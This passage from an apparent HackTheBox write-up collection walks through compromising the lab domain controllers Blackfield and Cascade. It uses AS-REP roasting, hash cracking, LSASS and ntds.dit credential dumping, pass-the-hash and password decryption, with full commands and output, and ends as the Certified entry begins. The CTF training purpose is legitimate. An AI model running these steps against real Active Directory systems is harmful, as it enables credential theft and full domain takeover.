smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 6h59m59s\n</code></pre> <p>We can establish a guest session with <code>rpc</code> but can't enumerate anything. However, we can look up SIDs, so using <code>nxc</code> we can get the users.</p> <pre><code>$ nxc smb 10.10.10.192 -u guest -p '' --rid-brute\nSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\guest: \nSMB         10.10.10.192    445    DC01             500: BLACKFIELD\\Administrator (SidTypeUser)\nSMB         10.10.10.192    445    DC01             501: BLACKFIELD\\Guest (SidTypeUser)\nSMB         10.10.10.192    445    DC01             502: BLACKFIELD\\krbtgt (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1000: BLACKFIELD\\DC01$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1103: BLACKFIELD\\audit2020 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1104: BLACKFIELD\\support (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1105: BLACKFIELD\\BLACKFIELD764430 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1412: BLACKFIELD\\BLACKFIELD438814 (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1413: BLACKFIELD\\svc_backup (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1414: BLACKFIELD\\lydericlefebvre (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1428: BLACKFIELD\\SRV-WEB$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1429: BLACKFIELD\\SRV-FILE$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1430: BLACKFIELD\\SRV-EXCHANGE$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1431: BLACKFIELD\\SRV-INTRANET$ (SidTypeUser)\n...\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"blackfield/#initial-access","title":"Initial Access","text":"<p>Having a user list, check if there are any that do not require pre-authentication.</p> <pre><code>$ impacket-GetNPUsers blackfield/ -dc-ip 10.10.10.192 -request -no-pass -usersfile users\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n$krb5asrep$23$support@BLACKFIELD:df60eb8acf15c7c3d405b323ac114c0f$fc63373eef5dcbbafb00a392e8e6a88b271f01d1a115648cd5f84fb818e90b9fc7b7b58639c7e8e33547253735464ff91540e84f9f9329a4c873af6f1768cf60c0e58ec0d02e4726b6cf9b524d73dbb12ee936979df0ca7104095bd05d4996e498654611dc4a71771721f23da104a8ca16377e561b7b8eaf1dc5b979c6084aea64cba5e59d6f2a933d1c39bb5083e5a8420aafe6ce186201a698f356eeaa78bb0a59df041e4d5f756c8ab986ebb9b44d76f6a764d24b6bd07a6e4cc7b566cc5b85517d6f71aec39260b1c0d8476ae2fb40a210f3b15d5c2a0b0ebc15bcde8426f1e671b52d2164c3a229153b96af\n</code></pre> <p>And using <code>hashcat</code>:</p> <pre><code>$ hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force\n\n$krb5asrep$23$support@BLACKFIELD:df60eb8acf15c7c3d405b323ac114c0f$fc63373eef5dcbbafb00a392e8e6a88b271f01d1a115648cd5f84fb818e90b9fc7b7b58639c7e8e33547253735464ff91540e84f9f9329a4c873af6f1768cf60c0e58ec0d02e4726b6cf9b524d73dbb12ee936979df0ca7104095bd05d4996e498654611dc4a71771721f23da104a8ca16377e561b7b8eaf1dc5b979c6084aea64cba5e59d6f2a933d1c39bb5083e5a8420aafe6ce186201a698f356eeaa78bb0a59df041e4d5f756c8ab986ebb9b44d76f6a764d24b6bd07a6e4cc7b566cc5b85517d6f71aec39260b1c0d8476ae2fb40a210f3b15d5c2a0b0ebc15bcde8426f1e671b52d2164c3a229153b96af:#00^BlackKnight\n</code></pre> <p>So <code>support:#00^BlackKnight</code></p> <p>Execute <code>bloodhound-python</code> and get the zip, then upload it to BloodHound.</p> <p></p> <p><code>support</code> has <code>ForceChangePassword</code> over the <code>audit2020</code> user.</p> <pre><code>$ net rpc password \"audit2020\" \"newP@ssword2022\" -U \"blackfield.local\"/\"support\"%\"#00^BlackKnight\" -S \"dc01.blackfield.local\"\n</code></pre> <p>This account can access a share called <code>forensic</code>:</p> <pre><code>$ smbclient -U 'audit2020%newP@ssword2022' //10.10.10.192/forensic \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sun Feb 23 14:03:16 2020\n  ..                                  D        0  Sun Feb 23 14:03:16 2020\n  commands_output                     D        0  Sun Feb 23 19:14:37 2020\n  memory_analysis                     D        0  Thu May 28 22:28:33 2020\n  tools                               D        0  Sun Feb 23 14:39:08 2020\n\n                5102079 blocks of size 4096. 1684962 blocks available\n</code></pre> <p>The <code>memory_analysis</code> folder contains a <code>lsass.zip</code>, let's download it.</p> <p>Unzip it and get the DMP file that can be parsed with <code>pypykatz</code>:</p> <pre><code>$ pypykatz lsa minidump lsass.DMP\nINFO:pypykatz:Parsing file lsass.DMP\nFILE: ======== lsass.DMP =======\n== LogonSession ==\nauthentication_id 406458 (633ba)\nsession_id 2\nusername svc_backup\ndomainname BLACKFIELD\nlogon_server DC01\nlogon_time 2020-02-23T18:00:03.423728+00:00\nsid S-1-5-21-4194615774-2175524697-3563712290-1413\nluid 406458\n        == MSV ==\n                Username: svc_backup\n                Domain: BLACKFIELD\n                LM: NA\n                NT: 9658d1d1dcd9250115e2205d9f48400d\n                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c\n                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000\n        == WDIGEST [633ba]==\n                username svc_backup\n                domainname BLACKFIELD\n                password None\n                password (hex)\n        == Kerberos ==\n                Username: svc_backup\n                Domain: BLACKFIELD.LOCAL\n        == WDIGEST [633ba]==\n                username svc_backup\n                domainname BLACKFIELD\n                password None\n                password (hex)\n...\n</code></pre> <p>Inside, we find the hash for the user <code>svc_backup</code>.</p> <p></p> <p>This user can access the machine.</p> <pre><code>$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents&gt; whoami\nblackfield\\svc_backup\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"blackfield/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name             SID\n===================== ==============================================\nblackfield\\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ==================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre> <p>The user belongs to the <code>Backup Operators</code> group so it has <code>SeBackupPrivilege</code>. Then, we can use <code>diskshadow</code> and <code>robocopy</code> to get the <code>ntds.dit</code> file.</p> <p>Upload a file with the <code>diskshadow</code> instructions. (I had to duplicate every end letter)</p> <pre><code>$ cat test.txt\nset context persistent nowriterss\nadd volume c: alias hackh\ncreatee\nexpose %hack% z::\n</code></pre> <p>Execute <code>diskshadow</code>:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_backup&gt; diskshadow /s .\\test.txt\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC01,  5/9/2025 11:18:03 AM\n\n-&gt; set context persistent nowriters\n-&gt; add volume c: alias hack\n-&gt; create\nAlias hack for shadow ID {a4e054ab-4db8-4f85-bb50-515d9b5678de} set as environment variable.\nAlias VSS_SHADOW_SET for shadow set ID {cfcc34c7-4162-4705-9714-f6283fee8639} set as environment variable.\n\nQuerying all shadow copies with the shadow copy set ID {cfcc34c7-4162-4705-9714-f6283fee8639}\n\n        * Shadow copy ID = {a4e054ab-4db8-4f85-bb50-515d9b5678de}               %hack%\n                - Shadow copy set: {cfcc34c7-4162-4705-9714-f6283fee8639}       %VSS_SHADOW_SET%\n                - Original count of shadow copies = 1\n                - Original volume name: \\\\?\\Volume{6cd5140b-0000-0000-0000-602200000000}\\ [C:\\]\n                - Creation time: 5/9/2025 11:18:04 AM\n                - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n                - Originating machine: DC01.BLACKFIELD.local\n                - Service machine: DC01.BLACKFIELD.local\n                - Not exposed\n                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}\n                - Attributes:  No_Auto_Release Persistent No_Writers Differential\n\nNumber of shadow copies listed: 1\n-&gt; expose %hack% z:\n-&gt; %hack% = {a4e054ab-4db8-4f85-bb50-515d9b5678de}\nThe shadow copy was successfully exposed as z:\\.\n-&gt;\n</code></pre> <p>Now we can access <code>C:</code> protected files via the alias, so get the <code>ntds.dit</code> file.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_backup&gt; robocopy /b z:\\windows\\ntds\\ . ntds.dit\n\n-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Started : Friday, May 9, 2025 11:18:12 AM\n   Source : z:\\windows\\ntds\\\n     Dest : C:\\Users\\svc_backup\\\n\n    Files : ntds.dit\n\n  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30\n\n------------------------------------------------------------------------------\n\n                           1    z:\\windows\\ntds\\\n            New File              18.0 m        ntds.dit\n  0.0%\n100%\n100%\n\n------------------------------------------------------------------------------\n\n               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Dirs :         1         0         1         0         0         0\n   Files :         1         1         0         0         0         0\n   Bytes :   18.00 m   18.00 m         0         0         0         0\n   Times :   0:00:00   0:00:00                       0:00:00   0:00:00\n\n\n   Speed :           120989538 Bytes/sec.\n   Speed :            6923.076 MegaBytes/min.\n   Ended : Friday, May 9, 2025 11:18:13 AM\n</code></pre> <p>We also need the <code>system</code> hive:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents&gt; reg save HKLM\\system system\nThe operation completed successfully.\n</code></pre> <p>Download them and open with <code>secretsdump</code>:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc_backup&gt; download ntds.dit\n*Evil-WinRM* PS C:\\Users\\svc_backup&gt; download system\n</code></pre> <pre><code>$ impacket-secretsdump -ntds ntds.dit -system system.save LOCAL\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c\n[*] Reading and decrypting hashes from ntds.dit \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:2340818ace50731486a8696029636d47:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::\naudit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::\nsupport:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::\nBLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\n...\n</code></pre> <p>Enter as <code>administrator</code> via PTH:</p> <pre><code>$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nblackfield\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"blackfield/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n4375a629c7c67c8e29db269060c955cb\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cascade/","title":"Cascade","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cascade/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.182            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 12:18 CEST\nNmap scan report for 10.10.10.182\nHost is up (0.041s latency).\nNot shown: 65520 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-10 10:19:27Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-05-10T10:20:21\n|_  start_date: 2025-05-10T10:16:21\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT      ADDRESS\n1   41.61 ms 10.10.14.1\n2   42.01 ms 10.10.10.182\n</code></pre> <p>We can enumerate users using <code>rpcclient</code>.</p> <pre><code>$ rpcclient -U '' -N //10.10.10.182\nrpcclient $&gt; enumdomusers\nuser:[CascGuest] rid:[0x1f5]\nuser:[arksvc] rid:[0x452]\nuser:[s.smith] rid:[0x453]\nuser:[r.thompson] rid:[0x455]\nuser:[util] rid:[0x457]\nuser:[j.wakefield] rid:[0x45c]\nuser:[s.hickson] rid:[0x461]\nuser:[j.goodhand] rid:[0x462]\nuser:[a.turnbull] rid:[0x464]\nuser:[e.crowe] rid:[0x467]\nuser:[b.hanson] rid:[0x468]\nuser:[d.burman] rid:[0x469]\nuser:[BackupSvc] rid:[0x46a]\nuser:[j.allen] rid:[0x46e]\nuser:[i.croft] rid:[0x46f]\n</code></pre> <p>Make a list.</p> <pre><code>$ cat users | awk -F[][] '{print $2}' | sponge users\n</code></pre> <p>Searching users with <code>ldapsearch</code>, we get the password for <code>r.thompson</code>.</p> <pre><code>$ ldapsearch -x -H ldap://10.10.10.182 -D \"cascade\\\\\" -W -b \"DC=cascade,DC=local\" \"(objectClass=user)\"\n\nEnter LDAP Password: \n# extended LDIF\n#\n# LDAPv3\n# base &lt;DC=cascade,DC=local&gt; with scope subtree\n# filter: (objectClass=user)\n# requesting: ALL\n#\n...\n# Ryan Thompson, Users, UK, cascade.local\ndn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local\nobjectClass: top\n...\ncascadeLegacyPwd: clk0bjVldmE=\n</code></pre> <p>Decode it.</p> <pre><code>$ echo 'clk0bjVldmE=' | base64 -d                                    \nrY4n5eva\n</code></pre> <p><code>r.thompson:rY4n5eva</code></p> <p>We can read some shares.</p> <p></p> <p>In <code>data</code> there are multiple interesting files.</p> <pre><code>$ ls                                                                                                   \n ArkAdRecycleBin.log   Meeting_Notes_June_2018.html   users  'VNC Install.reg'\n</code></pre> <p></p> <p>Steve says that the user <code>TempAdmin</code> has the same password as the normal admin.</p> <p>On the other hand, we have a password in the <code>VNC Install.reg</code> file.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cascade/#initial-access","title":"Initial Access","text":"<p>Searching, there is a repo PasswordDecrypts that shows how to decrypt VNC passwords on Linux.</p> <pre><code>$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv \n\n00000000  73 54 33 33 33 76 65 32                           |sT333ve2|\n</code></pre> <p>The password is valid for <code>s.smith</code>.</p> <p></p> <p>And has <code>pssession</code>.</p> <pre><code>$ nxc winrm 10.10.10.182 -u 's.smith' -p sT333ve2                  \nWINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)\nWINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\\s.smith:sT333ve2 (Pwn3d!)\n</code></pre> <pre><code>$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2                                                                           \nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt; whoami\ncascade\\s.smith\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cascade/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get the flag.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\s.smith\\desktop&gt; type user.txt\n995340c15f9857424228c9319a3dc077\n</code></pre> <p>We can see that <code>s.smith</code> has a logon script.</p> <pre><code>*Evil-WinRM* PS C:\\users\\s.smith&gt; net user s.smith\nUser name                    s.smith\nFull Name                    Steve Smith\nComment\nUser's comment\nCountry code                 000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            1/28/2020 8:58:05 PM\nPassword expires             Never\nPassword changeable          1/28/2020 8:58:05 PM\nPassword required            Yes\nUser may change password     No\n\nWorkstations allowed         All\nLogon script                 MapAuditDrive.vbs\n</code></pre> <p>Locate it and read it.</p> <pre><code>*Evil-WinRM* PS C:\\users\\s.smith&gt; Get-ChildItem -Path C:\\ -Include MapAuditDrive.vbs -File -Recurse -ErrorAction SilentlyContinue\n\n\n    Directory: C:\\Windows\\SYSVOL\\domain\\scripts\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        1/15/2020   9:50 PM            258 MapAuditDrive.vbs\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\users\\s.smith&gt; type C:\\Windows\\SYSVOL\\domain\\scripts\\MapAuditDrive.vbs\n'MapAuditDrive.vbs\nOption Explicit\nDim oNetwork, strDriveLetter, strRemotePath\nstrDriveLetter = \"F:\"\nstrRemotePath = \"\\\\CASC-DC1\\Audit$\"\nSet oNetwork = CreateObject(\"WScript.Network\")\noNetwork.MapNetworkDrive strDriveLetter, strRemotePath\nWScript.Quit\n</code></pre> <p>Enumerating SMB shares with <code>s.smith</code>, we can enter <code>Audit$</code>.</p> <pre><code>$ smbclient -U 's.smith%sT333ve2' //10.10.10.182/Audit$ \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Wed Jan 29 19:01:26 2020\n  ..                                  D        0  Wed Jan 29 19:01:26 2020\n  CascAudit.exe                      An    13312  Tue Jan 28 22:46:51 2020\n  CascCrypto.dll                     An    12288  Wed Jan 29 19:00:20 2020\n  DB                                  D        0  Tue Jan 28 22:40:59 2020\n  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020\n  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019\n  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019\n  x64                                 D        0  Sun Jan 26 23:25:27 2020\n  x86                                 D        0  Sun Jan 26 23:25:27 2020\n</code></pre> <p>Inside the <code>DB</code> directory there is a <code>.db</code> file. Get it and use <code>strings</code> on it. We see the password but it's encrypted.</p> <p></p> <p>Get <code>CascAudit.exe</code> and open it with <code>ILSpy</code> or <code>dotPeek</code>.</p> <p> </p> <p>Having the cipher and algorithm, we can make a decrypter function in Python or use CyberChef.</p> <p></p> <p>So <code>arksvc:w3lc0meFr31nd</code></p> <p>Reenter with the <code>arksvc</code> user.</p> <pre><code>$ evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; whoami\ncascade\\arksvc\n</code></pre> <p>This user is in the <code>AD Recycle Bin</code> group and we know that a user <code>TempAdmin</code> with the same password as <code>administrator</code> has been deleted, so by enumerating deleted objects we can get the admin's password.</p> <pre><code>*Evil-WinRM* PS C:\\&gt; whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                            Attributes\n=========================================== ================ ============================================== ===============================================================\nEveryone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group\nCASCADE\\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group\nCASCADE\\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\&gt; Get-ADObject -ldapfilter \"(&amp;(objectclass=user)(isDeleted=TRUE))\" -IncludeDeletedObjects\n\n\nDeleted           : True\nDistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local\nName              : CASC-WS1\n                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe\nObjectClass       : computer\nObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe\n\nDeleted           : True\nDistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local\nName              : TempAdmin\n                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059\nObjectClass       : user\nObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059\n\n*Evil-WinRM* PS C:\\&gt; Get-ADObject -ldapfilter \"(&amp;(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))\" -IncludeDeletedObjects -Properties *\n\n\naccountExpires                  : 9223372036854775807\nbadPasswordTime                 : 0\nbadPwdCount                     : 0\nCanonicalName                   : cascade.local/Deleted Objects/TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz\nCN                              : TempAdmin\n                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059\ncodePage                        : 0\ncountryCode                     : 0\nCreated                         : 1/27/2020 3:23:08 AM\ncreateTimeStamp                 : 1/27/2020 3:23:08 AM\nDeleted                         : True\nDescription                     :\nDisplayName                     : TempAdmin\n...\n</code></pre> <pre><code>$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d    \nbaCT3r1aN00dles\n</code></pre> <p>Enter as <code>administrator</code> via <code>evil-winrm</code>.</p> <pre><code>$ evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\ncascade\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cascade/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n8071c9d5398ae77294c2b756de6a1e20\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/","title":"Certified","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/#machine-information","title":"Machine Information","text":"<p>As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: <code>judith.mader</code> Password: <code>judith09</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.41 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 20:14 CEST\nNmap scan report for 10.10.11.41\nHost is up (0.041s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp   